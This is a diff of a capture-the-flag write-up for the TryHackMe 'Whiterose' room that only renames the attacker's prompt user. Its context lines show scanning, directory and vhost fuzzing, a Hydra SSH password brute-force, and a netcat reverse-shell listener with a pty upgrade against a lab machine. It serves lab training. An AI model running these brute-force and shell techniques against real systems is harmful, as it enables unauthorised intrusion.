@@ -21,7 +21,7 @@ And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`         
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/Whiterose]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
 └─$ rustscan -a 10.10.72.252 -- -A  
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -34,7 +34,7 @@ ________________________________________
  --------------------------------------
 I scanned ports so fast, even my computer was surprised.
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.72.252:22
@@ -66,7 +66,7 @@ Nothing interesting in the code .
 We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to find other hidden directories :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/Whiterose]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cyprusbank.thm/
 ===============================================================
 Gobuster v3.6
@@ -97,7 +97,7 @@ Nothing more, so we try for vhosts .
 We use [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to find hidden Vhosts [Fuzzing](../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md):
 
 ```
-┌──(hax㉿HaxonKali)-[~/Scrivania]
+┌──(mdn0x㉿mdn0xonKali)-[~/Scrivania]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.cyprusbank.thm' -u http://cyprusbank.thm -fs 57 -c 
 
         /'___\  /'___\           /'___\       
@@ -136,7 +136,7 @@ Remember we have some credentials, let's try to use it on [SSH](../../3%20-%20Ta
 I tried to find a password on ssh for user `olivia` and with [Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md) to get access to the system but hadn't success (too many errors) :
 
 ```
-──(hax㉿HaxonKali)-[~/THM/Whiterose]
+──(mdn0x㉿mdn0xonKali)-[~/THM/Whiterose]
 └─$ hydra -l olivia -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt  10.10.72.252 ssh -vvv 
 ```
 
@@ -228,7 +228,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 web@cyprusbank:~$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                         
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Whiterose]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Whiterose]
 └─$ stty raw -echo;fg 
 [1]  + continued  nc -lvnp 1337
                                reset
